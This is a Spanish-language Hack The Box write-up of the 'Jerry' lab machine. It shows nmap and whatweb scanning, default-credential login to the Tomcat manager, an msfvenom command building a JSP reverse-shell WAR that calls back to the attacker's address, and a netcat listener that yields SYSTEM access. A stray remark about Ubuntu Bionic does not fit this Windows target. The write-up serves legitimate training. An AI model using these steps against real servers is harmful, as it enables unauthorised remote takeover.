---
layout: single
title: Jerry - Hack The Box
excerpt: "Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso."
date: 2023-01-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-jerry/Jerry.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:

- hackthebox
- eJTP
- Fácil
- Windows

tags:

- Information Leakage
- Tomcat
---

![Jerry.png](/assets/images/htb-writeup-jerry/Jerry.png)

Certificaciones a aplicar: eJPT

Dificultad: Fácil

Habilidades: 

- Information Leakage
- Abusing Tomcat [Intrusion & Privilege Escalation]

# IP de la Maquina

10.10.10.95

# Reconocimiento

Identificando el sistema operativo.

```bash
whichSystem.py 10.10.10.95
```

![Hackforce-2022-12-18-18-37-24.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png)

Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
```

![Hackforce-2022-12-18-18-48-57.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png)

Función extractPorts.

```bash
extractPorts allPorts
```

![Hackforce-2022-12-18-18-49-49.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png)

# Análisis de Vulnerabilidades

Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.

```bash
nmap -sCV -p80 10.10.10.95 -oN targeted
```

![Hackforce-2022-12-18-19-00-49.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png)

Vemos que estamos ante un apache tomcat y nos muestra la version.

Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.

![Hackforce-2022-12-11-18-07-31.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png)

De esta manera vemos que estamos ante un Ubuntu Bionic.

Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.

```bash
whatweb http://10.10.10.95:8080
```

![Hackforce-2022-12-18-19-03-36.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png)

Vemos poco solo que estamos ante un Tomcat de version 7.0.88.

con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.

```bash
whatweb http://10.10.10.95:8080 -v

```

![Hackforce-2022-12-18-19-14-20.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png)

Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.

 

Vemos que es un panel de tomcat.

![Hackforce-2022-12-18-19-40-55.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png)

Vamos a probar una ruta que suele venir siempre cuando hay un tomcat. 

10.10.10.95:8080/manager/html.

![Hackforce-2022-12-18-19-43-27.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png)

Vemos que nos solicita credenciales para acceder.

Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.

Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.

![Hackforce-2022-12-18-19-47-53.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png)

Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.

Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.

![Hackforce-2022-12-18-19-51-20.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png)

Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.

Vemos que podemos subir nuestro propio archivo war.

![Hackforce-2022-12-18-19-53-30.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png)

Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.

# Explotación

Vamos a generar un war malicioso con msfvenom.

```bash
msfvenom -l payloads | grep java
```

![Hackforce-2022-12-18-20-04-18.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png)

Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.

Luego nos dirigimos al directorio content y creamos el payload con msfvenom.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f war -o shell.war
```

![Hackforce-2022-12-18-20-16-25.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png)

Listo ahi tendríamos nuestro war malicioso creado.

Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.

![Hackforce-2022-12-18-20-20-37.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png)

Así se miraría nuestro war malicioso en el servidor.

![Hackforce-2022-12-18-20-22-55.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png)

Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.

```bash
rlwrap nc -nlvp 443
```

![Hackforce-2022-12-18-20-25-47.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png)

Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.

![Hackforce-2022-12-18-20-29-47.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png)

Procedemos a buscar las flags y listo con esto terminaríamos la maquina.

![Hackforce-2022-12-18-20-41-30.png](/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png)

Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.

# Escalada de Privilegios

En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.

Listo con esto tendríamos hecha la maquina por completo, happy hacking.

Les dejo la resolución de la misma por s4vitar [Ver video](https://www.youtube.com/watch?v=bB-M5vPegMk)
